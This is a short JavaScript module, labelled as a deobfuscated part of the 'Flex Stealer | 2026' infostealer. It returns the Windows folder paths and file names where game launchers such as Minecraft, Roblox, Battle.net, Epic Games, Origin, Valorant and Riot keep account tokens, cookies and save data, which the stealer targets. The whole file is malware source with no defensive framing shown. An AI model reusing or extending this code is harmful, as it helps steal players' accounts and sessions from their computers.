/**
 * Deobfuscated Game Paths Module
 * Part of "Flex Stealer | 2026"
 */

const path = require('path');
const os = require('os');

const appData = process.env.APPDATA || (os.platform() === 'win32' ? path.join(os.homedir(), 'AppData', 'Roaming') : '');
const localAppData = process.env.LOCALAPPDATA || (os.platform() === 'win32' ? path.join(os.homedir(), 'AppData', 'Local') : '');

/**
 * Returns sensitive file paths for various games targeted by the stealer.
 */
const getGamePaths = () => {
    return {
        "Growtopia": {
            "path": path.join(localAppData, "Growtopia"),
            "files": ["save.dat"]
        },
        "Minecraft": {
            "path": path.join(appData, ".minecraft"),
            "files": ["launcher_profiles.json", "launcher_accounts.json"]
        },
        "Roblox": {
            "path": path.join(localAppData, "Roblox"),
            "files": ["cookies"]
        },
        "BattleNet": {
            "path": path.join(appData, "Battle.net"),
            "files": ["Battle.net.config"]
        },
        "Uplay": {
            "path": path.join(localAppData, "Ubisoft Game Launcher"),
            "files": ["user.dat"]
        },
        "EpicGames": {
            "path": path.join(localAppData, "EpicGamesLauncher"),
            "files": ["Data"]
        },
        "Origin": {
            "path": path.join(appData, "Origin"),
            "files": ["local_"]
        },
        "VALORANT": {
            "path": path.join(localAppData, "VALORANT"),
            "files": ["Local Settings"]
        },
        "RiotGames": {
            "path": path.join(localAppData, "Riot Games"),
            "files": ["Riot Client"]
        }
    };
};

module.exports = {
    getPaths: getGamePaths
};